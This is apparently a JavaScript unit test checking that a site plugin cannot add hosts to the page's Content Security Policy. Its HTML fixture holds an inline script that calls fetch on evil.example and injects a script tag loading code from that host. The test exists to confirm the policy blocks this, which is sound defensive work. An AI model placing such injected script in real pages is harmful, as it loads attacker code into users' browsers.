// A plugin adds nothing to the site's Content Security Policy: the browser refuses a load from any other host, even if its code tries.
import test from 'node:test';
import assert from 'node:assert/strict';
import { pagePolicy } from './csp.mjs';
import { manifestProblems } from './appManifest.mjs';

const html =
  '<html><head></head><body><script>fetch("https://evil.example/x"); document.head.append(Object.assign(document.createElement("script"),{src:"https://evil.example/a.js"}))</script></body></html>';
const plugin = { api: 5, role: 'plugin', label: 'P', publisher: 'Morpheme', license: 'MIT', icon: 'Palette', hint: 'P.', version: '1.0.0' };

test('a plugin that loads a script gets no new host in the site policy', () => {
  assert.deepEqual(manifestProblems(plugin, ['app.json']), []);
  // A plugin lists no host, so what its apps give the policy (`site`) is empty.
  const policy = pagePolicy(html, { site: {} });
  assert.doesNotMatch(policy, /evil\.example/);
  assert.match(policy, /script-src 'self' 'sha256-[^;]*;/);
  assert.match(policy, /connect-src 'self';/);
});
